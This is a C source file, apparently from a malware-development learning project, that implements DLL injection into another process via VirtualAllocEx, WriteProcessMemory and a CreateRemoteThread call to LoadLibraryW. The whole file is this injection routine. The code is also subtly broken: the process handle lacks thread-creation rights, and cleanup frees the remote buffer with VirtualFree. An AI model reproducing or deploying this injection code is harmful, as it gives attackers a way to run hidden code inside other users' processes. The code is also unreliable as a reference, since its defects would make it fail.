#include "injection.h"

//---------------------------------------------------------------------------------

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD ErrorStatus
        ) {

    if (NULL == FunctionName || 0 == ErrorStatus) {
        WARN("either you didn't supply a function name"
                "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorStatus);
    return;

}

//---------------------------------------------------------------------------------

BOOL DLLInjection(
        _In_ DWORD ProcessId,
        _In_ LPCWSTR DLLPath,
        _In_ SIZE_T DLLPathSize 
        ) { 

    BOOL    STATE          = TRUE;
    PVOID   RemoteBuffer   = NULL;
    HANDLE  ThreadHandle   = NULL;
    HANDLE  ProcessHandle  = NULL;
    HMODULE Kernel32Handle = NULL;
    SIZE_T  BytesWritten   = 0;

    if (NULL == DLLPath || 0 == DLLPathSize) {
        WARN("DLL path's not set. exiting...");
        return FALSE;
    }

    INFO("supplied DLL: \"%S\"", DLLPath);
    INFO("trying to get a handle on the process (%ld)...", ProcessId);
    ProcessHandle = OpenProcess(
            (PROCESS_VM_OPERATION | PROCESS_VM_WRITE), 
            FALSE, 
            ProcessId
            );
    if (NULL == ProcessHandle){
        PrettyFormat("OpenProcess", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got a handle on the process!", ProcessHandle);

    Kernel32Handle = GetModuleHandleW(L"Kernel32");
    if (NULL == Kernel32Handle) {
        PrettyFormat("GetModuleHandleW", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] got a handle on Kernel32.dll!", Kernel32Handle);

    LPTHREAD_START_ROUTINE p_LoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(
            Kernel32Handle, "LoadLibraryW");
    if (NULL == p_LoadLibraryW) {
        WARN("failed to get the address of LoadLibraryW()");
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] got the address of LoadLibraryW()!", p_LoadLibraryW);

    RemoteBuffer = VirtualAllocEx(
            ProcessHandle, 
            NULL, 
            DLLPathSize, 
            (MEM_COMMIT | MEM_RESERVE), 
            PAGE_READWRITE
            );
    if (NULL == RemoteBuffer) {
        PrettyFormat("VirtualAllocEx", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE permissions.", RemoteBuffer);

    WriteProcessMemory(
            ProcessHandle, 
            RemoteBuffer,
            DLLPath, 
            DLLPathSize, 
            &BytesWritten 
            );
    OKAY("[0x%p] [RW-] wrote %zu-bytes to allocated buffer!", RemoteBuffer, DLLPathSize);

    ThreadHandle = CreateRemoteThread(
            ProcessHandle,
            NULL,
            0,
            p_LoadLibraryW,
            RemoteBuffer, /* argument for LoadLibrary() */
            0,
            0
            );
    if (NULL == ThreadHandle) {
        PrettyFormat("CreateRemoteThread", GetLastError());
        STATE = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] got a handle on the thread! waiting for it to finish execution...", ThreadHandle);

    WaitForSingleObject(ThreadHandle, INFINITE);
    INFO("[0x%p] thread finished execution! cleaning up...", ThreadHandle);

CLEANUP:

    INFO("beginning cleanup...");
    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
        INFO("[0x%p] closed thread handle", ThreadHandle);
    }

    if (ProcessHandle) {
        CloseHandle(ProcessHandle);
        INFO("[0x%p] closed process handle", ProcessHandle);
    }

    if (RemoteBuffer) {
        VirtualFree(RemoteBuffer, 0, MEM_RELEASE);
        INFO("[0x%p] remote buffer freed", RemoteBuffer);
    }

    return STATE;

}

//---------------------------------------------------------------------------------
